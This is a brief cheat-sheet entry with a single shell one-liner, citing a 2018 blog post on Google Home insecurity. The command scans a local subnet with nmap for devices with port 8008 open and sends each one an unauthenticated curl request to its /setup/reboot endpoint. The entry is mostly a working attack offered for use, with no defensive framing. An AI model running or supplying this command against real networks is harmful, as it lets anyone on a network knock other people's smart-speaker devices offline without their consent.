##### Reboot all google home devices on network
nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{"params":"now"}' http://%:8008/setup/reboot

##### Source
https://jerrygamblin.com/2018/10/29/google-home-insecurity/
